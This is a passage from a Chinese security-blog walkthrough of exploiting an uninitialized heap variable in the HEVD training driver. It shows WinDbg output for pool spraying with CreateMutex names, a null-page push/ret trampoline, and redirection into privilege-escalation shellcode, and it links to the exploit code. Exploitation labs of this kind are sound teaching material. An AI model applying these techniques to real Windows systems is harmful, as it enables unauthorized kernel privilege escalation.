0064006b&nbsp;c3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ret</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">这样，相当于将shellcode入口指针入栈，esp变成shellcode指针，然后ret，之后就会跳转到shellcode中执行shellcode，这样对于NtAllocateVirtualMemory布局操作就简单很多。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(0, 0, 0);">这样，我们只需要申请一个零页空间就行了。</span></p><pre class="brush:cpp;toolbar:false">kd&gt;&nbsp;dd&nbsp;00460046
00460046&nbsp;&nbsp;35278068&nbsp;0000c301</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">布置上我们的push shellcode addr;ret</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">然后就是关键的CreateMutex，这个会创建互斥体，我们申请多个互斥体，完成对堆的布局。</span></p><pre class="brush:diff;toolbar:false">kd&gt;&nbsp;p
KernelBase!CreateMutexA+0x19:
001b:75961675&nbsp;e809000000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;call&nbsp;&nbsp;&nbsp;&nbsp;KernelBase!CreateMutexExA&nbsp;(75961683)
kd&gt;&nbsp;dd&nbsp;esp
0099e73c&nbsp;&nbsp;00000000&nbsp;0099f788&nbsp;00000001&nbsp;001f0001
0099e74c&nbsp;&nbsp;0099f81c&nbsp;0110320e&nbsp;00000000&nbsp;00000001
0099e75c&nbsp;&nbsp;0099f788&nbsp;9c1c5b57&nbsp;00000000&nbsp;00000000
0099e76c&nbsp;&nbsp;00000000&nbsp;00000000&nbsp;00000000&nbsp;00000000
0099e77c&nbsp;&nbsp;00000000&nbsp;00000000&nbsp;00000000&nbsp;00000000
0099e78c&nbsp;&nbsp;00000000&nbsp;00000000&nbsp;00000000&nbsp;00000000
0099e79c&nbsp;&nbsp;00000000&nbsp;00000000&nbsp;00000000&nbsp;00000000
0099e7ac&nbsp;&nbsp;00000000&nbsp;00000000&nbsp;00000000&nbsp;00000000
kd&gt;&nbsp;dc&nbsp;99f788
0099f788&nbsp;&nbsp;46464646&nbsp;67716870&nbsp;656d7568&nbsp;6e6c7961&nbsp;&nbsp;FFFFphqghumeayln
0099f798&nbsp;&nbsp;7864666c&nbsp;63726966&nbsp;78637376&nbsp;77626767&nbsp;&nbsp;lfdxfircvscxggbw
0099f7a8&nbsp;&nbsp;716e666b&nbsp;77787564&nbsp;6f666e66&nbsp;7273767a&nbsp;&nbsp;kfnqduxwfnfozvsr
0099f7b8&nbsp;&nbsp;706a6b74&nbsp;67706572&nbsp;70727867&nbsp;7976726e&nbsp;&nbsp;tkjprepggxrpnrvy
0099f7c8&nbsp;&nbsp;776d7473&nbsp;79737963&nbsp;70716379&nbsp;6b697665&nbsp;&nbsp;stmwcysyycqpevik
0099f7d8&nbsp;&nbsp;6d666665&nbsp;6d696e7a&nbsp;73616b6b&nbsp;72737776&nbsp;&nbsp;effmznimkkasvwsr
0099f7e8&nbsp;&nbsp;6b7a6e65&nbsp;66786379&nbsp;736c7478&nbsp;73707967&nbsp;&nbsp;enzkycxfxtlsgyps
0099f7f8&nbsp;&nbsp;70646166&nbsp;00656f6f&nbsp;9c1c5b57&nbsp;0099e760&nbsp;&nbsp;fadpooe.W[..`...</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">申请多个互斥体后，可以看到对池空间的控制。可以看到，第一个参数是mutexname，这个前面必须包含46，这样才能进行函数调用后，在pool中覆盖到00460046的值。</span></p><pre class="brush:cf;toolbar:false">kd&gt;&nbsp;r&nbsp;eax
eax=a6630b38
kd&gt;&nbsp;!pool&nbsp;a6630b38
Pool&nbsp;page&nbsp;a6630b38&nbsp;region&nbsp;is&nbsp;Paged&nbsp;pool
&nbsp;a6630000&nbsp;size:&nbsp;&nbsp;100&nbsp;previous&nbsp;size:&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;(Allocated)&nbsp;&nbsp;IoNm
&nbsp;a6630100&nbsp;size:&nbsp;&nbsp;&nbsp;&nbsp;8&nbsp;previous&nbsp;size:&nbsp;&nbsp;100&nbsp;&nbsp;(Free)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0.4.
&nbsp;a6630108&nbsp;size:&nbsp;&nbsp;128&nbsp;previous&nbsp;size:&nbsp;&nbsp;&nbsp;&nbsp;8&nbsp;&nbsp;(Allocated)&nbsp;&nbsp;NtFs
&nbsp;a6630230&nbsp;size:&nbsp;&nbsp;&nbsp;&nbsp;8&nbsp;previous&nbsp;size:&nbsp;&nbsp;128&nbsp;&nbsp;(Free)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Sect
&nbsp;a6630238&nbsp;size:&nbsp;&nbsp;&nbsp;18&nbsp;previous&nbsp;size:&nbsp;&nbsp;&nbsp;&nbsp;8&nbsp;&nbsp;(Allocated)&nbsp;&nbsp;Ntf0
&nbsp;a6630250&nbsp;size:&nbsp;&nbsp;&nbsp;38&nbsp;previous&nbsp;size:&nbsp;&nbsp;&nbsp;18&nbsp;&nbsp;(Allocated)&nbsp;&nbsp;CMVa
&nbsp;a6630288&nbsp;size:&nbsp;&nbsp;&nbsp;68&nbsp;previous&nbsp;size:&nbsp;&nbsp;&nbsp;38&nbsp;&nbsp;(Allocated)&nbsp;&nbsp;FIcs
&nbsp;a66302f0&nbsp;size:&nbsp;&nbsp;&nbsp;f8&nbsp;previous&nbsp;size:&nbsp;&nbsp;&nbsp;68&nbsp;&nbsp;(Allocated)&nbsp;&nbsp;ObNm
&nbsp;a66303e8&nbsp;size:&nbsp;&nbsp;138&nbsp;previous&nbsp;size:&nbsp;&nbsp;&nbsp;f8&nbsp;&nbsp;(Allocated)&nbsp;&nbsp;NtFs
&nbsp;a6630520&nbsp;size:&nbsp;&nbsp;100&nbsp;previous&nbsp;size:&nbsp;&nbsp;138&nbsp;&nbsp;(Allocated)&nbsp;&nbsp;IoNm
&nbsp;a6630620&nbsp;size:&nbsp;&nbsp;128&nbsp;previous&nbsp;size:&nbsp;&nbsp;100&nbsp;&nbsp;(Free)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ObNm
&nbsp;a6630748&nbsp;size:&nbsp;&nbsp;&nbsp;68&nbsp;previous&nbsp;size:&nbsp;&nbsp;128&nbsp;&nbsp;(Allocated)&nbsp;&nbsp;FIcs
&nbsp;a66307b0&nbsp;size:&nbsp;&nbsp;380&nbsp;previous&nbsp;size:&nbsp;&nbsp;&nbsp;68&nbsp;&nbsp;(Allocated)&nbsp;&nbsp;Ntff
*a6630b30&nbsp;size:&nbsp;&nbsp;&nbsp;f8&nbsp;previous&nbsp;size:&nbsp;&nbsp;380&nbsp;&nbsp;(Allocated)&nbsp;*Hack
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Owning&nbsp;component&nbsp;:&nbsp;Unknown&nbsp;(update&nbsp;pooltag.txt)</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">这里a6630b30中包含了8字节的pool header，和0xf0的nopage pool，通过CreateMutex，我们会对kernel pool占用。</span></p><pre class="brush:as3;toolbar:false">kd&gt;&nbsp;dd&nbsp;a6630b38
a6630b38&nbsp;&nbsp;00000000&nbsp;00460046&nbsp;00780069&nbsp;00620074
a6630b48&nbsp;&nbsp;0074006b&nbsp;00770065&nbsp;00630071&nbsp;006a0078
a6630b58&nbsp;&nbsp;00740065&nbsp;00720063&nbsp;00730061&nbsp;006a007a
a6630b68&nbsp;&nbsp;006e0065&nbsp;00790070&nbsp;006a0064&nbsp;00680061
a6630b78&nbsp;&nbsp;00710067&nbsp;00660072&nbsp;006c007a&nbsp;0079006f
a6630b88&nbsp;&nbsp;007a0075&nbsp;0068006f&nbsp;00760074&nbsp;006a0078
a6630b98&nbsp;&nbsp;006b0063&nbsp;00730073&nbsp;00750064&nbsp;00770077</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">可以看到，现在头部结构已经被00460046占用，接下来，还是由于UserValue和MagicValue的原因，引发Uninitialized Heap Variable。</span></p><pre class="brush:cpp;toolbar:false">kd&gt;&nbsp;g
Breakpoint&nbsp;1&nbsp;hit
HEVD+0x299e:
9231999e&nbsp;ff1598783192&nbsp;&nbsp;&nbsp;&nbsp;call&nbsp;&nbsp;&nbsp;&nbsp;dword&nbsp;ptr&nbsp;[HEVD+0x898&nbsp;(92317898)]
kd&gt;&nbsp;p
HEVD+0x29a4:
923199a4&nbsp;8945dc&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dword&nbsp;ptr&nbsp;[ebp-24h],eax
kd&gt;&nbsp;dd&nbsp;eax
889f8610&nbsp;&nbsp;00000000&nbsp;00460046&nbsp;00780069&nbsp;00620074
kd&gt;&nbsp;dd&nbsp;00460046
00460046&nbsp;&nbsp;35278068&nbsp;0000c301</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">随后由于池中结构体的内容未初始化，内核池中存放的还是我们通过CreateMutex布置的内容，直接引用会跳转到我们通过NtAllocateVirtualMemory申请的空间。</span></p><pre class="brush:cpp;toolbar:false">kd&gt;&nbsp;p
HEVD+0x2ac0:
95327ac0&nbsp;8b4ddc&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ecx,dword&nbsp;ptr&nbsp;[ebp-24h]
kd&gt;&nbsp;p
HEVD+0x2ac3:
95327ac3&nbsp;8b5104&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;edx,dword&nbsp;ptr&nbsp;[ecx+4]
kd&gt;&nbsp;r&nbsp;ecx
ecx=a86c5580
kd&gt;&nbsp;p
HEVD+0x2ac6:
95327ac6&nbsp;ffd2&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;call&nbsp;&nbsp;&nbsp;&nbsp;edx
kd&gt;&nbsp;t
00460046&nbsp;68b0141401&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;&nbsp;&nbsp;&nbsp;11414B0h
kd&gt;&nbsp;p
0064006b&nbsp;c3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ret
kd&gt;&nbsp;p
011414b0&nbsp;53&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;&nbsp;&nbsp;&nbsp;ebx
011414b0&nbsp;53&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;&nbsp;&nbsp;&nbsp;ebx
011414b1&nbsp;56&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;&nbsp;&nbsp;&nbsp;esi
011414b2&nbsp;57&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;&nbsp;&nbsp;&nbsp;edi
011414b3&nbsp;60&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pushad
011414b4&nbsp;33c0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;xor&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;eax,eax
011414b6&nbsp;648b8024010000&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;eax,dword&nbsp;ptr&nbsp;fs:[eax+124h]
011414bd&nbsp;8b4050&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;eax,dword&nbsp;ptr&nbsp;[eax+50h]
011414c0&nbsp;8bc8&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ecx,eax</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">随后push shellcode之后，esp的值被修改，直接ret会跳转到shellcode address，执行提权。</span></p><p style="text-indent: 0em; text-align: center;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><img src="http://p6.qhimg.com/t01a1bceaf758d8b7c7.png" title="t01a1bceaf758d8b7c7.png" alt="http://p5.qhimg.com/t01a1bceaf758d8b7c7.png"/></span></p><p style="text-indent: 0em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br/></span></p><p style="text-indent: 0em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><p style="text-indent: 2em;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">最后我贴上更新后的项目代码</span></strong></p><p style="text-indent: 2em;"><a href="https://github.com/k0keoyo/try_exploit/tree/master/HEVD_Source_with_Unin_Heap_Variable_Chall" _src="https://github.com/k0keoyo/try_exploit/tree/master/HEVD_Source_with_Unin_Heap_Variable_Chall" style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-decoration: underline;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">https://github.com/k0keoyo/try_exploit/tree/master/HEVD_Source_with_Unin_Heap_Variable_Chall</span></a><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">&nbsp;</span><br/></p><p><br/></p></p>
                <hr/>
                <p style="text-align: center;">
                    <img src="http://bobao.360.cn/img/app.jpeg"/>
                    <img src="http://bobao.360.cn/img/weixin.jpeg"/>
                </p>
                                <p>本文转载自 whereisk0shl.top<br/><a class="text-more" href="http://whereisk0shl.top/hevd-kernel-exploitation-uninitialized-stack-&amp;-heap.html" target="_blank">原文链接：http://whereisk0shl.top/hevd-kernel-exploitation-uninitialized-stack-&amp;-heap.html</a></p>
                            </div>
            <div style="margin-top: 20px;background-color:#FFFFFF">
    <input type="hidden" id="detail_title" name="detail_title" value="【技术分享】HEVD Kernel Exploitation--Uninitialized Stack & Heap - 安全客 - 有思想的安全新媒体" />
    <input type="hidden" id="use_nickname" name="use_nickname" value="0" />
    <a name="mao"></a>
    <div class="reg-log mobile-hiden">
        <div class="" id="userTo">   
            <div id="to-list" class="input-text" style="">
                <textarea disabled="disabled" class="hide"  id="comment-content" to="to"></textarea>
                <ul id="preadded" style="display:none">       
                </ul>
                <div id="to-auto" style="width: 200px">
                    <ul id="feed">
                    </ul>
                </div>
            </div>
        </div>
        <input type="hidden" id="source-id" value="3448" />
        <input type="hidden" id="source-type" value="learning" />
        <input type="hidden" id="post-comment-url" value="/comment/add" />
        <input type="hidden" id="post-nickname-url-ajax" value="/comment/randnicknameajax" />
        <input type="hidden" id="post-check-login-url-ajax" value="/comment/checklogin" />
        <input type="hidden" id="stoken_comment_set" value="ea3898fb4df38673fdeb61c458234054">                 <span class="join">参与讨论，请先 <a href="javascript:;" class="comment-login">登录</a> | <a href="javascript:;" class="comment-reg">注册</a> |  <a href="javascript:;" class="anonymous-comment">匿名评论</a></span>
            </div>
    <div class="mobile-hide" style="width: 870px; margin: 0 auto;">
        <label style="vertical-align:middle;" for="use_nickname">匿名</label> 
        <input style="vertical-align:middle;" id="trigger-nickname" name="use_nickname" class="use_nickname" type="checkbox" value="0" />

        <a href="javascript:;" class="apply-use button" id="submit-comment" data-target="/comment/add">发布</a>
    </div>


    <div class="clearfix"></div>
    <div class="comments">
        <div class="comments-head">
            <span class="title">用户评论</span>
        </div>
                <div class="comment-none alarm-info bg-primary">无任何评论</div>
            </div>
</div>
<script>
    $(function () {
        $('.anonymous-comment').click(function () {
            $(".join").hide();
            $(".reg-log textarea").first().removeAttr("disabled").show();
            $('#use_nickname').val('1');
//            $('#trigger-nickname').attr('checked', true);
            $('#trigger-nickname').trigger('click');
        });
        //为所有复选框绑定事件
//        checkbox_on_click();
        //ajax随机获取昵称
//        randnicknameajax(0);
        //ajax检测登录状态
        comment_check_login();
    });



    function input_checkbox(flag) {
        $('input:checkbox').each(function () {
            var value = flag ? 1 : 0;
            $(this).prop('checked', flag);
            $(this).val(value);
        });
    }

//ajax随机获取昵称
    function randnicknameajax(flag) {
        $.ajax({
            type: 'POST',
            url: $('#post-nickname-url-ajax').val(),
            data: {limit: 1, flag: flag},
            dataType: "json",
            success: function (data) {
                $('#nick-name').val(data.data[0]);
                _nick_name=data.data[0];
            }
        });
    }
    $();
//ajax检测登录状态
    function comment_check_login() {
        $.ajax({
            type: 'POST',
            url: $('#post-check-login-url-ajax').val(),
            data: {},
            dataType: "json",
            success: function (data) {
                if (data.success) {
                    $('.join').hide();
                    $(".reg-log textarea").first().removeAttr("disabled").show();
                    $("#span_use_nickname").show();
                    $('#use_nickname').val('0');
                    $('#use_nickname').attr('checked', false);
                }
            }
        });
    }
</script>        </div>
    </div>
    <div class="side-bar">
        <div class="mod hot-news">
    <div class="head-bar clearfix">
        <h2><i class="icon icon-hot"></i><span>热门知识</span></h2>
    </div>
    <ul class="links-list">
                                <li><a href="/learning/detail/4411.html" alt="【漏洞预警】一个换行符引发的奥斯卡0day漏洞(CVE-2017-8759)重现——最新的Office高级威胁攻击预警" target="_blank">【漏洞预警】一个换行符引发的奥斯卡...</a></li>
                                <li><a href="/learning/detail/4416.html" alt="【漏洞预警】Microsoft .NET Framework漏洞（CVE–2017–8759）预警" target="_blank">【漏洞预警】Microsoft .NE...</a></li>
                                <li><a href="/learning/detail/4414.html" alt="【技术分享】妙用JavaScript绕过XSS过滤" target="_blank">【技术分享】妙用JavaScrip...</a></li>
                                <li><a href="/learning/detail/4418.html" alt="【技术分享】利用威胁情报数据平台拓展APT攻击线索一例" target="_blank">【技术分享】利用威胁情报数据平台拓...</a></li>
                                <li><a href="/learning/detail/4417.html" alt="【知识】9月15日 - 每日安全知识热点" target="_blank">【知识】9月15日 - 每日安全知识热...</a></li>
                                <li><a href="/learning/detail/4425.html" alt="【安全报告】XShellGhost事件技术回顾报告" target="_blank">【安全报告】XShellGhost事件...</a></li>
            </ul>
</div>        <!-- 友情链接 -->
        <div class="mod blog-links mobile-hide">
    <div class="head-bar clearfix">
        <h2><i class="icon icon-link"></i><span>友情链接</span></h2>
        <a href="/links/index.html" class="more">更多<i></i></a>
    </div>
        <ul class="links-list">
                <li><a href="http://bbs.360safe.com" alt="360安全社区" target="_blank">360安全社区</a></li>
                <li><a href="http://zhuji.360.cn" alt="360主机卫士" target="_blank">360主机卫士</a></li>
                <li><a href="http://blogs.360.cn/" alt="奇虎360技术博客" target="_blank">奇虎360技术博客</a></li>
                <li><a href="http://wangzhan.360.cn/" alt="360网站卫士" target="_blank">360网站卫士</a></li>
                <li><a href="http://webscan.360.cn/" alt="360网站安全检测" target="_blank">360网站安全检测</a></li>
                <li><a href="http://research.360.cn/report/" alt="360研究报告" target="_blank">360研究报告</a></li>
                <li><a href="http://unicorn.360.cn/" alt="360 Unicorn Team" target="_blank">360 Unicorn Team</a></li>
                <li><a href="http://appscan.360.cn/" alt="360捉虫猎手" target="_blank">360捉虫猎手</a></li>
                <li><a href="https://threathunter.org/" alt="ThreatHunter社区" target="_blank">ThreatHunter社区</a></li>
                <li><a href="http://security.360.cn/" alt="360安全应急响应中心" target="_blank">360安全应急响应中心</a></li>
            </ul>
    </div>
        <!-- 联系我们 -->
        <div class="mod contact mobile-hide" style="text-align:center">
    <div class="head-bar clearfix">
        <h2><i></i><span>关注我们</span></h2>
    </div>
    <!-- 微信关注 -->
    <ul class="contact-way">
        <li><a>微信关注</a></li>
    </ul>
    <div style="padding-left:20px;padding-bottom:15px;">
    <img src="/img/qrcode_adlab_weixin.png?v=1.1"  width="145px" height="145px;"/>
    </div>
    
    <!-- APP下载 -->
    <ul class="contact-way">
        <li><a>安全播报APP</a></li>
    </ul>
    <div style="padding-left:20px;padding-bottom:15px;">
    <img src="/img/scan_code_big.png?v=1.1"  width="145px" height="145px;"/>
    </div>
    
</div>

    </div>
</div>

<script type="text/javascript" src="/js/jquery-ui.min.js?v=3.0"></script>
<script type="text/javascript" src="/js/jquery.noty.packaged.min.js?v=3.0"></script>
<script type="text/javascript" src="/js/common.js?v=4.5"></script>
<script>$(function() {sync_count('comment');});</script>


<!-- 语法高亮 -->
<script type="text/javascript" src="/ue/SyntaxHighlighter/shCore.js"></script>
<script type="text/javascript">SyntaxHighlighter.all();sync_count('vul');sync_count('news');sync_count('learning');sync_count('activity');sync_count('course');sync_count('ctf');</script>
    </div>

        <div class="footer">
        <div class="friend-link">
            <a href="http://www.360.cn/" target="_blank">360首页</a>
            <span>|</span>
            <a href="/introduce/index" target="_blank">关于我们</a>
            <span>|</span>
            <a href="/introduce/index" target="_blank">联系我们</a>
            <span>|</span>
            <a href="/links/index.html" target="_blank">友情链接</a>
            <span>|</span>
            <a href="/introduce/index" target="_blank">招贤纳士</a>
        </div>
        <div class="copy">
            Copyright &copy; 360网络攻防实验室 All Rights Reserved <span class="copy_icp">京ICP证080047号[京ICP备08010314号-6]</span>
        </div>
    </div>
    
</div>

<!--奇舞团统计-->

<script src='https://s.ssl.qhimg.com/static/f5407c785655e6a1/monitor_analytic.js'></script>
<script>
    monitor.setProject('QH_171_1').getTrack().getClickAndKeydown().getClickHeatmap(10, 1);
</script>

<div class="hide">
    <script src="https://s95.cnzz.com/z_stat.php?id=1253147824&web_id=1253147824" language="JavaScript"></script>
</div>
<div class="backToTop_wrap off">
    <a id="back_to_top" class="backToTop" href="javascript:;" title="返回顶部"></a>
</div>
<script>
    var $backToTop_wrap = $(".backToTop_wrap"),
        $backToTop_btn = $("#back_to_top");

    if ($(window).scrollTop() > 100) {
        $backToTop_wrap.removeClass("off");
    }
    else {
        $backToTop_wrap.addClass("off");
    }

    $(window).on("scroll", function () {
        if ($(this).scrollTop() > 100) {
            $backToTop_wrap.removeClass("off");
        }
        else {
            $backToTop_wrap.addClass("off");
        }
    });

    $backToTop_btn.on("click", function () {
        $("html, body").animate({scrollTop: 0}, 120);
    });

    $(function () {
        var navlist = $('.nav-list > li');

        navlist.each(function () {
            $(this).on('mouseenter', function () {
                $(this).addClass('selected');
            });

            $(this).on('mouseleave', function () {
                $(this).removeClass('selected');
            });
        });
    })
</script>



</body>
</html>
